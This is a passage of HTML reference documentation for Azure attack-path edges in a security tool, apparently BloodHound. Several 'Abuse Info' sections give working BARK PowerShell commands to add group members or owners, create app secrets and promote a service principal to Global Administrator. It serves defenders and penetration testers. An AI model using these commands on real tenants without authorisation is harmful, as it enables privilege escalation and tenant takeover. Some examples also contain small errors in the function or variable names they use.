<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1078/">https://attack.mitre.org/techniques/T1078/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a">https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a</a></p></li>
<li><p><a class="reference external" href="https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines">https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmemberof">
<h2>AZMemberOf<a class="headerlink" href="#azmemberof" title="Link to this heading"></a></h2>
<p>The given asset is a member of the group.</p>
<p>Groups in Azure Active Directory grant their direct members any privileges
the group itself has. If a group has an AzureAD admin role, direct members
of the group inherit those permissions.</p>
<section id="id147">
<h3>Abuse Info<a class="headerlink" href="#id147" title="Link to this heading"></a></h3>
<p>No abuse is necessary. This edge simply indicates that a principal
belongs to a security group.</p>
</section>
<section id="id148">
<h3>Opsec Considerations<a class="headerlink" href="#id148" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id149">
<h3>References<a class="headerlink" href="#id149" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/active-directory/roles/groups-create-eligible">https://docs.microsoft.com/en-us/azure/active-directory/roles/groups-create-eligible</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgaddmember">
<h2>AZMGAddMember<a class="headerlink" href="#azmgaddmember" title="Link to this heading"></a></h2>
<p>This edge is created during post-processing. It is created against
non role assignable Azure AD security groups when a Service
Principal has one of the following MS Graph app role assignments:</p>
<ul class="simple">
<li><p>Directory.ReadWrite.All</p></li>
<li><p>Group.ReadWrite.All</p></li>
<li><p>GroupMember.ReadWrite.All</p></li>
</ul>
<p>It is created against all Azure AD security groups, including those
that are role assignable, when a Service Principal has the following
MS Graph app role:</p>
<ul class="simple">
<li><p>RoleManagement.ReadWrite.Directory</p></li>
</ul>
<p>You will not see this privilege when using just the Azure portal
or any other Microsoft tooling. If you audit the roles and administrators
affecting any particular Azure security group, you will not see
that the Service Principal can add members to the group, but it
indeed can because of the parallel access management system used
by MS Graph.</p>
<section id="id150">
<h3>Abuse Info<a class="headerlink" href="#id150" title="Link to this heading"></a></h3>
<p>You can abuse this privilege using BARK’s Add-AZMemberToGroup
function.</p>
<p>This function requires you to supply an MS Graph-scoped JWT
associated with the Service Principal that has the privilege
to add principal to the target group. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
by supplying a Service Principal Client ID and secret:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-MSGraphTokenWithClientCredentials `
    -ClientID &quot;34c7f844-b6d7-47f3-b1b8-720e0ecba49c&quot; `
    -ClientSecret &quot;asdf...&quot; `
    -TenantName &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Then use BARK’s Add-AZMemberToGroup function to add a new principial
to the target group:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Add-AZMemberToGroup `
    -PrincipalID = &quot;028362ca-90ae-41f2-ae9f-1a678cc17391&quot; `
    -TargetGroupId &quot;b9801b7a-fcec-44e2-a21b-86cb7ec718e4&quot; `
    -Token $MGToken.access_token
</pre></div>
</div>
<p>Now you can re-authenticate as the principial you just added to the group
and continue your attack path, now having whatever privileges the target
group has.</p>
</section>
<section id="id151">
<h3>Opsec Considerations<a class="headerlink" href="#id151" title="Link to this heading"></a></h3>
<p>The Azure activity log for the tenant will log who added what
principal to what group, including the date and time.</p>
</section>
<section id="id152">
<h3>References<a class="headerlink" href="#id152" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgaddowner">
<h2>AZMGAddOwner<a class="headerlink" href="#azmgaddowner" title="Link to this heading"></a></h2>
<p>This edge is created during post-processing. It is created against
all App Registrations and Service Principals within the same tenant
when a Service Principal has the following MS Graph app role:</p>
<ul class="simple">
<li><p>Application.ReadWrite.All</p></li>
</ul>
<p>It is also created against all Azure Service Principals when a
Service Principal has the following MS Graph app role:</p>
<ul class="simple">
<li><p>ServicePrincipalEndpoint.ReadWrite.All</p></li>
</ul>
<p>It is also created against all Azure security groups that are not
role eligible when a Service Principal has one of the following MS
Graph app roles:</p>
<ul class="simple">
<li><p>Directory.ReadWrite.All</p></li>
<li><p>Group.ReadWrite.All</p></li>
</ul>
<p>Finally, it is created against all Azure security groups and all
Azure App Registrations when a Service Principal has the following
MS Graph app role:</p>
<ul class="simple">
<li><p>RoleManagement.ReadWrite.Directory</p></li>
</ul>
<p>You will not see these privileges when auditing permissions against
any of the mentioned objects when you use Microsoft tooling, including
the Azure portal and the MS Graph API itself.</p>
<section id="id153">
<h3>Abuse Info<a class="headerlink" href="#id153" title="Link to this heading"></a></h3>
<p>You can use BARK to add a new owner to the target object. The
BARK function you use will depend on the target object type,
but all of the functions follow a similar syntax.</p>
<p>These functions require you to supply an MS Graph-scoped JWT
associated with the Service Principal that has the privilege
to add a new owner to the target object. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
by supplying a Service Principal Client ID and secret:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-MSGraphTokenWithClientCredentials `
    -ClientID &quot;34c7f844-b6d7-47f3-b1b8-720e0ecba49c&quot; `
    -ClientSecret &quot;asdf...&quot; `
    -TenantName &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>To add a new owner to a Service Principal, use BARK’s
New-ServicePrincipalOwner function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-ServicePrincipalOwner `
    -ServicePrincipalObjectId &quot;082cf9b3-24e2-427b-bcde-88ffdccb5fad&quot; `
    -NewOwnerObjectId &quot;cea271c4-7b01-4f57-932d-99d752bbbc60&quot; `
    -Token $Token
</pre></div>
</div>
<p>To add a new owner to an App Registration, use BARK’s New-AppOwner function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppOwner `
    -AppObjectId &quot;52114a0d-fa5b-4ee5-9a29-2ba048d46eee&quot; `
    -NewOwnerObjectId &quot;cea271c4-7b01-4f57-932d-99d752bbbc60&quot; `
    -Token $Token
</pre></div>
</div>
<p>To add a new owner to a Group, use BARK’s New-GroupOwner function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppOwner `
    -GroupObjectId &quot;352032bf-161d-4788-b77c-b6f935339770&quot; `
    -NewOwnerObjectId &quot;cea271c4-7b01-4f57-932d-99d752bbbc60&quot; `
    -Token $Token
</pre></div>
</div>
</section>
<section id="id154">
<h3>Opsec Considerations<a class="headerlink" href="#id154" title="Link to this heading"></a></h3>
<p>Any time you add an owner to any Azure object, the AzureAD audit
logs will create an event logging who added an owner to what object,
as well as what the new owner added to the object was.</p>
</section>
<section id="id155">
<h3>References<a class="headerlink" href="#id155" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgaddsecret">
<h2>AZMGAddSecret<a class="headerlink" href="#azmgaddsecret" title="Link to this heading"></a></h2>
<p>This edge is created during post-processing. It is created against
all Azure App Registrations and Service Principals when a Service
Principal has one of the following MS Graph app roles:</p>
<ul class="simple">
<li><p>Application.ReadWrite.All</p></li>
<li><p>RoleManagement.ReadWrite.Directory</p></li>
</ul>
<p>You will not see this privilege when using just the Azure portal
or any other Microsoft tooling. If you audit the roles and administrators
affecting any particular Azure App or Service Principal, you will not see
that the Service Principal can add secrets to the object, but it
indeed can because of the parallel access management system used
by MS Graph.</p>
<section id="id156">
<h3>Abuse Info<a class="headerlink" href="#id156" title="Link to this heading"></a></h3>
<p>There are several ways to perform this abuse, depending on what
sort of access you have to the credentials of the object that
holds this privilege against the target object. If you have an
interactive web browser session for the Azure portal, it is as
simple as finding the target App in the portal and adding a new
secret to the object using the “Certificates &amp; secrets” tab.
Service Principals do not have this tab in the Azure portal but
you can add secrets to them with the MS Graph API.
No matter what kind of control you have, you will be able to
perform this abuse by using BARK’s New-AppRegSecret or
New-ServicePrincipalSecret functions.</p>
<p>These functions require you to supply an MS Graph-scoped JWT
associated with the Service Principal that has the privilege
to add secrets to the target object. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
by supplying a Service Principal Client ID and secret:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-MSGraphTokenWithClientCredentials `
    -ClientID &quot;34c7f844-b6d7-47f3-b1b8-720e0ecba49c&quot; `
    -ClientSecret &quot;asdf...&quot; `
    -TenantName &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Then use BARK’s New-AppRegSecret to add a new secret to the
target application:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppRegSecret `
    -AppRegObjectID &quot;d878...&quot; `
    -Token $MGToken.access_token
</pre></div>
</div>
<p>The output will contain the plain-text secret you just created
for the target app:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppRegSecret `
    -AppRegObjectID &quot;d878...&quot; `
    -Token $MGToken.access_token

Name                Value
----                -----
AppRegSecretValue   odg8Q~...
AppRegAppId         4d31...
AppRegObjectId      d878...
</pre></div>
</div>
<p>With this plain text secret, you can now acquire tokens as the
service principal associated with the app. You can easily do
this with BARK’s Get-MSGraphToken function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SPToken = Get-MSGraphToken `
    -ClientID &quot;4d31...&quot; `
    -ClientSecret &quot;odg8Q~...&quot; `
    -TenantName &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Now you can use this JWT to perform actions against any other MS
Graph endpoint as the service principal, continuing your attack
path with the privileges of that service principal.</p>
</section>
<section id="id157">
<h3>Opsec Considerations<a class="headerlink" href="#id157" title="Link to this heading"></a></h3>
<p>When you create a new secret for an App or Service Principal,
Azure creates an event called “Update application - Certificates
and secrets management”. This event describes who added the secret
to which application or service principal.</p>
</section>
<section id="id158">
<h3>References<a class="headerlink" href="#id158" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgapplication-readwrite-all">
<h2>AZMGApplication_ReadWrite_All<a class="headerlink" href="#azmgapplication-readwrite-all" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the Application.ReadWrite.All edge.</p>
<section id="id159">
<h3>Abuse Info<a class="headerlink" href="#id159" title="Link to this heading"></a></h3>
<p>The edge is not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id160">
<h3>Opsec Considerations<a class="headerlink" href="#id160" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id161">
<h3>References<a class="headerlink" href="#id161" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgapproleassignment-readwrite-all">
<h2>AZMGAppRoleAssignment_ReadWrite_All<a class="headerlink" href="#azmgapproleassignment-readwrite-all" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the AppRoleAssignment.ReadWrite.All edge.</p>
<section id="id162">
<h3>Abuse Info<a class="headerlink" href="#id162" title="Link to this heading"></a></h3>
<p>The edge is not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id163">
<h3>Opsec Considerations<a class="headerlink" href="#id163" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id164">
<h3>References<a class="headerlink" href="#id164" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgdirectory-readwrite-all">
<h2>AZMGDirectory_ReadWrite_All<a class="headerlink" href="#azmgdirectory-readwrite-all" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the Directory.ReadWrite.All edge.</p>
<section id="id165">
<h3>Abuse Info<a class="headerlink" href="#id165" title="Link to this heading"></a></h3>
<p>The edge is not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id166">
<h3>Opsec Considerations<a class="headerlink" href="#id166" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id167">
<h3>References<a class="headerlink" href="#id167" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmggrantapproles">
<h2>AZMGGrantAppRoles<a class="headerlink" href="#azmggrantapproles" title="Link to this heading"></a></h2>
<p>This edge is created during post-processing. It is created against
AzureAD tenant objects when a Service Principal has one of the following
MS Graph app role assignments:</p>
<ul class="simple">
<li><p>AppRoleAssignment.ReadWrite.All</p></li>
<li><p>RoleManagement.ReadWrite.Directory</p></li>
</ul>
<section id="id168">
<h3>Abuse Info<a class="headerlink" href="#id168" title="Link to this heading"></a></h3>
<p>With the ability to grant arbitrary app roles, you can grant
the RoleManagement.ReadWrite.Directory app role to a Service
Principal you already control, and then promote it or another
principal to Global Administrator.</p>
<p>These functions require you to supply an MS Graph-scoped JWT
associated with the Service Principal that has the privilege
to grant app roles. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
by supplying a Service Principal Client ID and secret:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-MSGraphTokenWithClientCredentials `
    -ClientID &quot;34c7f844-b6d7-47f3-b1b8-720e0ecba49c&quot; `
    -ClientSecret &quot;asdf...&quot; `
    -TenantName &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Use BARK’s Get-AllAzureADServicePrincipals to collect all
Service Principal objects in the tenant:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SPs = Get-AllAzureADServicePrincipals `
    -Token $MGToken
</pre></div>
</div>
<p>Next, find the MS Graph Service Principal’s ID. You can do this by
piping $SPs to Where-Object, finding objects where the appId value
matches the universal ID for the MS Graph Service Principal, which is
00000003-0000-0000-c000-000000000000:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SPs | ?{$_.appId -Like &quot;00000003-0000-0000-c000-000000000000&quot;} | Select id
</pre></div>
</div>
<p>The output will be the object ID of the MS Graph Service Principal.
Take that ID and use it as the “ResourceID” argument for BARK’s
New-AppRoleAssignment function. The AppRoleID of ‘9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8’
is the universal ID for RoleManagement.ReadWrite.Directory. The
SPObjectId is the object ID of the Service Principal you want to grant
this app role to:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AppRoleAssignment `
    -SPObjectId &quot;6b6f9289-fe92-4930-a331-9575e0a4c1d8&quot; `
    -AppRoleID &quot;9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8&quot; `
    -ResourceID &quot;9858020a-4c00-4399-9ae4-e7897a8333fa&quot; `
    -Token $MGToken
</pre></div>
</div>
<p>If successful, the output of this command will show you the App Role
assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory
MS Graph app role, you can promote the Service Principal to Global Administrator
using BARK’s New-AzureADRoleAssignment.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AzureADRoleAssignment `
    -PrincipalID &quot;6b6f9289-fe92-4930-a331-9575e0a4c1d8&quot; `
    -RoleDefinitionId &quot;62e90394-69f5-4237-9190-012177145e10&quot; `
    -Token $MGToken
</pre></div>
</div>
<p>If successful, the output will include the principal ID, the role ID, and a
unique ID for the role assignment.</p>
</section>
<section id="id169">
<h3>Opsec Considerations<a class="headerlink" href="#id169" title="Link to this heading"></a></h3>
<p>When you assign an app role to a Service Principal, the Azure
Audit logs will create an event called “Add app role assignment
to service principal”. This event describes who made the change,
what the target service principal was, and what app role assignment
was granted.</p>
</section>
<section id="id170">
<h3>References<a class="headerlink" href="#id170" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmggrantrole">
<h2>AZMGGrantRole<a class="headerlink" href="#azmggrantrole" title="Link to this heading"></a></h2>
<p>This edge is created during post-processing. It is created against
all AzureAD admin roles when a Service Principal has the following
MS Graph app role assignment:</p>
<ul class="simple">
<li><p>RoleManagement.ReadWrite.Directory</p></li>
</ul>
<p>This privilege allows the Service Principal to promote itself or
any other principal to any AzureAD admin role, including Global
Administrator.</p>
<section id="id171">
<h3>Abuse Info<a class="headerlink" href="#id171" title="Link to this heading"></a></h3>
<p>To abuse this privilege, you can promote a principal you control
to Global Administrator using BARK’s New-AzureADRoleAssignment.
This function requires you to supply an MS Graph-scoped JWT
associated with the Service Principal that has the privilege
to grant AzureAD admin roles. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
by supplying a Service Principal Client ID and secret:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$MGToken = Get-MSGraphTokenWithClientCredentials `
    -ClientID &quot;34c7f844-b6d7-47f3-b1b8-720e0ecba49c&quot; `
    -ClientSecret &quot;asdf...&quot; `
    -TenantName &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Then use BARK’s New-AzureADRoleAssignment function to grant the
AzureAD role to your target principal:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AzureADRoleAssignment `
    -PrincipalID &quot;6b6f9289-fe92-4930-a331-9575e0a4c1d8&quot; `
    -RoleDefinitionId &quot;62e90394-69f5-4237-9190-012177145e10&quot; `
    -Token $MGToken
</pre></div>
</div>
<p>If successful, the output will include the principal ID, the role ID, and a
unique ID for the role assignment.</p>
</section>
<section id="id172">
<h3>Opsec Considerations<a class="headerlink" href="#id172" title="Link to this heading"></a></h3>
<p>When you assign an AzureAD admin role to a principal
using this privilege, the Azure Audit log will create
an event called “Add member to role outside of PIM
(permanent)”.</p>
</section>
<section id="id173">
<h3>References<a class="headerlink" href="#id173" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmggroupmember-readwrite-all">
<h2>AZMGGroupMember_ReadWrite_All<a class="headerlink" href="#azmggroupmember-readwrite-all" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the GroupMember.ReadWrite.All edge.</p>
<section id="id174">
<h3>Abuse Info<a class="headerlink" href="#id174" title="Link to this heading"></a></h3>
<p>The edge is
not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id175">
<h3>Opsec Considerations<a class="headerlink" href="#id175" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id176">
<h3>References<a class="headerlink" href="#id176" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmggroup-readwrite-all">
<h2>AZMGGroup_ReadWrite_All<a class="headerlink" href="#azmggroup-readwrite-all" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the Group.ReadWrite.All edge.</p>
<section id="id177">
<h3>Abuse Info<a class="headerlink" href="#id177" title="Link to this heading"></a></h3>
<p>The edge is
not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id178">
<h3>Opsec Considerations<a class="headerlink" href="#id178" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id179">
<h3>References<a class="headerlink" href="#id179" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgrolemanagement-readwrite-directory">
<h2>AZMGRoleManagement_ReadWrite_Directory<a class="headerlink" href="#azmgrolemanagement-readwrite-directory" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the RoleManagement.ReadWrite.Directory edge.</p>
<section id="id180">
<h3>Abuse Info<a class="headerlink" href="#id180" title="Link to this heading"></a></h3>
<p>The edge is
not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id181">
<h3>Opsec Considerations<a class="headerlink" href="#id181" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id182">
<h3>References<a class="headerlink" href="#id182" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes">https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmgserviceprincipalendpoint-readwrite-all">
<h2>AZMGServicePrincipalEndpoint_ReadWrite_All<a class="headerlink" href="#azmgserviceprincipalendpoint-readwrite-all" title="Link to this heading"></a></h2>
<p>This edge is created when a Service Principal has been
granted the ServicePrincipalEndpoint.ReadWrite.All edge.</p>
<section id="id183">
<h3>Abuse Info<a class="headerlink" href="#id183" title="Link to this heading"></a></h3>
<p>The edge is
not abusable, but is used during post-processing to create
abusable edges.</p>
</section>
<section id="id184">
<h3>Opsec Considerations<a class="headerlink" href="#id184" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id185">
<h3>References<a class="headerlink" href="#id185" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="aznoderesourcegroup">
<h2>AZNodeResourceGroup<a class="headerlink" href="#aznoderesourcegroup" title="Link to this heading"></a></h2>
<p>This edge is created to link Azure Kubernetes Service
Managed Clusters to the Virtual Machine Scale Sets they
use to execute commands on.</p>
<p>The system-assigned identity for the AKS Cluster will
have the Contributor role against the target Resource Group
and its child Virtual Machine Scale Sets.</p>
<section id="id186">
<h3>Abuse Info<a class="headerlink" href="#id186" title="Link to this heading"></a></h3>
<p>You will abuse this relationship by executing a command
against the AKS Managed Cluster the edge is emiting from.
You can target any managed identity assignment scoped to
the Virtual Machine Scale Sets under the target Resource Group.</p>
</section>
<section id="id187">
<h3>Opsec Considerations<a class="headerlink" href="#id187" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in
general Azure will create a log event for each abuse.</p>
</section>
<section id="id188">
<h3>References<a class="headerlink" href="#id188" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
<li><p><a class="reference external" href="https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/">https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azowns">
<h2>AZOwns<a class="headerlink" href="#azowns" title="Link to this heading"></a></h2>
<p>Object ownership means almost all abuses are possible against the
target object.</p>
<section id="id189">
<h3>Abuse Info<a class="headerlink" href="#id189" title="Link to this heading"></a></h3>
<p>Everything a Contributor can do, with the addition of assigning
rights to resources.</p>
</section>
<section id="id190">
<h3>Opsec Considerations<a class="headerlink" href="#id190" title="Link to this heading"></a></h3>
<p>This depends on which abuse you perform, but in general Azure will
create a log for each abuse action.</p>
</section>
<section id="id191">
<h3>References<a class="headerlink" href="#id191" title="Link to this heading"></a></h3>
<ul class="simple">
